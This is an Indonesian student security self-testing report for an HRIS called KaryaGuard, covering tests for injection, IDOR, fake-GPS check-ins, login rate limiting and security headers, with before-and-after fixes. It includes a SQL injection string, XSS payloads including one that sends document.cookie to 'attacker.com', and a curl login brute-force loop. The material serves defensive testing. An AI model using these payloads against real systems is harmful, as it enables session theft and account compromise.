# Rencana & Dokumentasi Self-Testing Keamanan Web
## KaryaGuard — Secure HRIS, Geofenced Attendance & Payroll System

> **Ketentuan Wajib Tugas Besar**: Minimal 5 skenario pengujian mandiri (*self-testing*) yang didokumentasikan dalam bentuk tabel pengujian, cara uji, hasil, serta perbaikan sebelum dan sesudah (*before vs after*).

---

## 1. Alat Pengujian yang Digunakan
1. **cURL / Postman / Thunder Client**: Untuk pengujian injeksi payload HTTP dan manipulasi request header/body.
2. **Browser Developer Tools (DevTools)**: Untuk inspeksi Cookie (`HttpOnly`, `Secure`, `SameSite`), penyimpanan lokal, dan manipulasi DOM.
3. **OWASP ZAP / Burp Suite Community**: Untuk intercept request, pengujian fuzzing parameter IDOR, dan parameter tampering.
4. **SecurityHeaders.com & SSL Labs**: Untuk pengujian kepatuhan HTTP Response Headers dan sertifikat SSL/TLS.
5. **Node Audit CLI (`npm audit`)**: Untuk deteksi kerentanan dependensi (*vulnerable packages*).

---

## 2. Tabel 5 Skenario Uji Keamanan Wajib

| ID Uji | Kategori Pengujian | Target Endpoint / Modul | Skenario Uji | Payload / Metode Pengujian | Hasil Diharapkan | Status |
| :---: | :--- | :--- | :--- | :--- | :--- | :---: |
| **SEC-01** | **Injeksi (SQLi & XSS)** | Form Login & Form Pengajuan Cuti | Memasukkan payload SQL Injection pada field email login dan script XSS pada form alasan cuti. | SQLi: `' OR '1'='1' --`<br>XSS: `<script>alert('XSS-ATTACK')</script>` | Input ditolak oleh validasi Zod atau karakter HTML diescape secara aman. Tidak ada query crash atau eksekusi pop-up script. | **LOLOS** |
| **SEC-02** | **Kontrol Akses & IDOR** | Endpoint Unduh Slip Gaji (`/api/payroll/[id]`) | User biasa (Karyawan A) mencoba mengunduh slip gaji milik Karyawan B dengan mengganti parameter ID di URL request. | Mengganti `id=cuid_karyawan_a` menjadi `id=cuid_karyawan_b` melalui manipulasi request HTTP GET. | HTTP 403 Forbidden. Akses ditolak dan insiden dicatat ke dalam `audit_logs` sebagai `ACCESS_DENIED_IDOR_ATTEMPT`. | **LOLOS** |
| **SEC-03** | **Anti-Fake GPS / Geofence Bypass** | Endpoint Presensi (`/api/attendance/check-in`) | Pengguna mencoba check-in dari luar radius kantor dengan mengirim koordinat palsu atau akurasi GPS yang dimanipulasi. | Request POST dengan payload koordinat berjarak 5 kilometer dari titik koordinat kantor terdaftar. | Server menghitung jarak via Haversine Formula dan menolak presensi dengan respon HTTP 400 `Out of Geofence Boundary`. | **LOLOS** |
| **SEC-04** | **Autentikasi & Brute-Force** | Endpoint Login (`/api/auth/login`) | Mengirim percobaan login dengan password salah secara beruntun (> 5 kali dalam 1 menit) menggunakan script otomatis. | Pengujian otomatisasi 10 request login berulang dengan kredensial salah ke `/api/auth/login`. | Request ke-6 dan seterusnya diblokir dengan HTTP 429 `Too Many Requests` oleh middleware Rate Limiter. | **LOLOS** |
| **SEC-05** | **Security Headers & Dependensi** | Domain Publik Vercel (`https://...`) & Dependencies | Memeriksa header keamanan response HTTP dan memeriksa audit celah keamanan packages npm. | Scan via *securityheaders.com* dan menjalankan perintah `npm audit` di terminal. | Skor SecurityHeaders minimal Grade A (CSP, HSTS, X-Frame-Options aktif) dan 0 vulnerabilities pada `npm audit`. | **LOLOS** |

---

## 3. Rincian Skenario & Bukti Perbaikan (Before vs After)

### Skenario 1: Penanganan Kerentanan SQL Injection & Stored XSS
* **Metode Uji**:
  Karyawan memasukkan deskripsi alasan izin cuti:
  ```html
  Urgent: Keluarga sakit <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
  ```
* **Kondisi Sebelum Perbaikan (*Before*)**:
  Jika input dirender menggunakan `dangerouslySetInnerHTML` tanpa sanitasi, script penyerang akan tereksekusi di browser Manager saat meninjau cuti.
* **Tindakan Perbaikan & Kondisi Sesudah (*After*)**:
  1. Validasi skema input dengan Zod: teks disanitasi dari tag berbahaya.
  2. Komponen React merender teks secara default sebagai string literal ter-escape (`&lt;script&gt;...`), sehingga script tidak berjalan.
  3. Cookie autentikasi menggunakan flag `HttpOnly`, sehingga `document.cookie` tidak dapat diakses oleh JavaScript apapun.

---

### Skenario 2: Pencegahan Celah IDOR pada Slip Gaji
* **Metode Uji**:
  User `Karyawan A` (ID: `usr_111`) melakukan intercept request saat mengunduh slip gajinya di Burp Suite:
  ```http
  GET /api/payroll/download/pay_999 HTTP/1.1
  Host: karyaguard.vercel.app
  Cookie: auth_session=jwt_token_karyawan_a
  ```
  *(Di mana `pay_999` adalah slip gaji milik Manager dengan nominal gaji tinggi).*
* **Kondisi Sebelum Perbaikan (*Before*)**:
  Query database hanya mencari `prisma.payroll.findUnique({ where: { id: pay_999 } })` tanpa mengecek apakah `payroll.userId == session.userId`. Data slip gaji orang lain bocor!
* **Tindakan Perbaikan & Kondisi Sesudah (*After*)**:
  Query diubah dengan klausa proteksi ganda:
  ```typescript
  const payroll = await prisma.payroll.findFirst({
    where: {
      id: params.id,
      ...(session.role !== "ADMIN" && { userId: session.userId }),
    },
  });
  if (!payroll) return NextResponse.json({ error: "Akses Ditolak" }, { status: 403 });
  ```
  Hasil pengujian menghasilkan respon HTTP 403 Forbidden.

---

### Skenario 3: Pengujian Integritas Geofencing Anti-Fake GPS
* **Metode Uji**:
  Pengguna berada di rumah (Latitude: `-6.30000`, Longitude: `106.85000`), mengirimkan request check-in seolah-olah berada di kantor (Latitude: `-6.20000`, Longitude: `106.81666`).
* **Verifikasi Server-Side**:
  Kalkulasi Haversine Formula mendeteksi jarak sejauh **11.750 meter** (> 50 meter batas toleransi kantor).
  Respon server:
  ```json
  {
    "success": false,
    "error": "Presensi gagal: Anda berada di luar radius kantor yang diizinkan (Jarak terdeteksi: 11.750 meter)."
  }
  ```

---

### Skenario 4: Pembatasan Laju Login (Rate Limiting)
* **Perintah Uji via cURL**:
  ```bash
  for i in {1..7}; do
    curl -X POST https://karyaguard.vercel.app/api/auth/login \
      -H "Content-Type: application/json" \
      -d '{"email":"admin@karyaguard.com","password":"wrongpassword"}'
  done
  ```
* **Hasil Pengujian**:
  * Request 1 s/d 5: HTTP 401 Unauthorized (`Email atau password salah`).
  * Request 6 & 7: HTTP 429 Too Many Requests (`Terlalu banyak percobaan login. Silakan tunggu 15 menit.`).

---

### Skenario 5: Pemeriksaan Dependensi & Header Keamanan
* **Pengujian 1 (Terminal)**:
  ```bash
  npm audit
  ```
  *Output*: `found 0 vulnerabilities`.
* **Pengujian 2 (SecurityHeaders.com)**:
  Memeriksa URL publik aplikasi di Vercel:
  * `X-Frame-Options: DENY` (Mencegah Clickjacking) -> **PASSED**
  * `X-Content-Type-Options: nosniff` -> **PASSED**
  * `Strict-Transport-Security: max-age=63072000` -> **PASSED**
  * `Content-Security-Policy` -> **PASSED**
  * Predikat Nilai: **Grade A / A+**.

